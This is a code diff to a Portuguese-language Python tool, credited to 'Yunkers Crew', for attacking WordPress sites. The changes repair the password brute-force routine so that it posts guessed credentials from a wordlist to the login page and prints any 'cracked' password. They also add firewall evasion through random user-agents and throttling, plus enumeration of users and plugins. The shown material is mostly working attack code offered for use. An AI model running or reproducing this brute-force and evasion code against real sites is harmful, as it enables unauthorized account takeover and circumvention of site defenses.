@@ -15,32 +15,33 @@ index = """
  °ÛÛÛÛÛÛÛÛÛÛ  ÛÛÛ°°ÛÛÛ ÛÛÛ°°   ÛÛÛ°°ÛÛÛ°°ÛÛÛ  ÛÛÛ°°ÛÛÛ  ÛÛÛ°°ÛÛÛ°°ÛÛÛ°°ÛÛÛ °°ÛÛÛÛÛÛÛÛÛ 
  °ÛÛÛ°°°°°°  °ÛÛÛ °ÛÛÛ°°ÛÛÛÛÛ °ÛÛÛÛÛÛÛ  °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ  °°°°°°°°ÛÛÛ
  °ÛÛÛ        °ÛÛÛ °ÛÛÛ °°°°ÛÛÛ°ÛÛÛ°°°   °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ  ÛÛÛ    °ÛÛÛ
- ÛÛÛÛÛ       °°ÛÛÛÛÛÛ  ÛÛÛÛÛÛ °°ÛÛÛÛÛÛ  ÛÛÛÛÛ°°ÛÛÛÛÛÛÛÛ°°ÛÛÛÛÛÛ  ÛÛÛÛ ÛÛÛÛÛ°°ÛÛÛÛÛÛÛÛÛ 
+ ÛÛÛÛÛ       °°ÛÛÛÛÛÛ  ÛÛÛÛÛÛ °°ÛÛÛÛÛÛ  ÛÛÛÛÛ°°ÛÛÛÛÛÛÛÛ°°ÛÛÛÛÛÛ  ÛÛÛÛ ÛÛÛÛÛ°°ÛÛÛÛÛÛÛÛÛ  v2
 °°°°°         °°°°°°  °°°°°°   °°°°°°  °°°°°  °°°°°°°°  °°°°°°  °°°° °°°°°  °°°°°°°°°  
 
-	* Wordpress simple scanner && Brute force tool (BETA)
-	* Criado por Supr3m0 && W4r1o6k (Yunkers Crew)
-	* Facebook: www.facebook.com/yunkers01
+	* Ferramenta básica para pentest em sites Wordpress.
+	* Criado por Supr3m0 (Yunkers Crew)
+	* Facebook: www.facebook.com/yunkers01/
 """
 manual = """
---url (-u)            Site alvo (--url localhost)
---requisicoes (-r)    Tempo para cada requisição (--requisicoes 10)
+	--url (-u)            Site alvo (--url localhost)
+	--requisicoes (-r)    Tempo para cada requisição (--requisicoes 10)
 
-Brute Force:
---firewall-bypass     Burla o firewall no ataque de brute force, porém será lento!!! (--firewall-bypass)
---enumerar (-E)       Enumerar usuários do site (--enumerar)
---no-clear            Não limpa o terminal/cmd quando for fazer o ataque de brute force (--no-clear)
---usuario (-us)       Usuário que será usado no brute force (--usuario admin)
---wordlist (-w)       Wordlist que será usada no brute force (--wordlist w.txt)
---login-page          Página de login que será feito o ataque de brute force, padrão = wp-login.php (--login-page admin.php)
---post-user           (AVANÇADO) Parametro que será enviado o usuário no modo POST, padrão = log (--post-user username)
---post-pass           (AVANÇADO) Parametro que será enviado a senha  no modo POST, padrão = pwd (--post-pass password)
+	--firewall-bypass     Burla o firewall no ataque de brute force, porém será lento!!! (--firewall-bypass)
+	--random-agent        Muda o "user-agent" a cada requisição (Ajuda a burlar o firewall)
+	--no-clear            Não limpa o terminal/cmd quando for fazer o ataque de brute force (--no-clear)
+	--usuario (-us)       Usuário que será usado no brute force (--usuario admin)
+	--wordlist (-w)       Wordlist que será usada no brute force (--wordlist w.txt)
+	--login-page          Página de login que será feito o ataque de brute force, padrão = wp-login.php (--login-page admin.php)
+	--post-user           (AVANÇADO) Parametro que será enviado o usuário no modo POST, padrão = log (--post-user username)
+	--post-pass           (AVANÇADO) Parametro que será enviado a senha  no modo POST, padrão = pwd (--post-pass password)
 
-Informações:
---no-robots           Não checa os robots (--no-robots)
---no-infohost         Não checa as informações do host (--no-infohost)
---no-arquivos         Não checa os arquivos desprotegidos (--no-arquivos)
---no-fpd              Não checa se contém falha 'FPD' no site (--no-fpd)
+	--no-robots           Não checa os robots (--no-robots)
+	--no-infohost         Não checa as informações do host (--no-infohost)
+	--no-arquivos         Não checa os arquivos desprotegidos (--no-arquivos)
+	--no-fpd              Não checa se contém falha 'FPD' no site (--no-fpd)
+
+	--enumerar (-E)       Enumerar usuários do site (--enumerar)
+	--enumerar-p (-EP)    Enumerar plugins do site fazendo brute force de diretórios (-EP)
 
 Use: python3 {} -u http://SITE/
 OBS: Para o programa entender que você quer fazer o ataque de brute force, insira o parametro "--usuario" e o parametro "--wordlist".
@@ -49,7 +50,7 @@ parser = arg.ArgumentParser()
 parser.add_argument("--url","-u", action='store')
 parser.add_argument("--usuario", "-us", action='store')
 parser.add_argument("--wordlist", "-w", action='store')
-parser.add_argument("--requisicoes", "-r", action='store', type=int, default="10")
+parser.add_argument("--requisicoes", "-r", action='store', type=int, default=10)
 parser.add_argument("--firewall-bypass", "-FB", action='store_true')
 parser.add_argument("--enumerar", "-E", action='store_true')
 parser.add_argument("--no-robots", action='store_true')
@@ -200,7 +201,6 @@ def verifica_brute_force():
 		blacklist = []
 		for x in plugins:
 			try:
-
 				sys.stdout.write(".") ; sys.stdout.flush()
 				req = r.get(url+x, headers=user_agent, timeout=param.requisicoes)
 				if req.status_code != 404:
@@ -235,12 +235,12 @@ def ataque_bf():
 		num +=1
 		if param.firewall_bypass: time.sleep(0.5)
 		else: time.sleep(0.2)
-		payload = {param.post_user, param.usuario, 
-				   param.post_pass, linha}
+		payload = {param.post_user :  param.usuario, 
+				   param.post_pass :  linha}
 		url_usar = url + param.login_page
-		envia = r.post(url_usar, headers=user_agent, timeout=param.requisicoes)
-		if envia.status_code == 200 and not "wp-login.php?action=lostpassword" in envia.text:
-			sys.stdout.write("\r[+] Login: {}\n[+] Senha: {}\n[+] Login Page: {}\n[+] Parametro post (usuario): {}\n[+] Parametro post (senha): {}.".format(param.usuario, linha, param.login_page, param.post_user, param.post_pass))
+		envia = r.post(url_usar, data=payload, headers=user_agent, timeout=param.requisicoes)
+		if  not "?action=lostpassword" in envia.text:
+			sys.stdout.write("\r\nSenha Quebrada!!!\n Login: {} / Senha: {} / Página de Login: {}".format(param.usuario, linha, url_usar))
 			input("\nAperte 'Enter' para fechar.")
 			exit()
 		else:
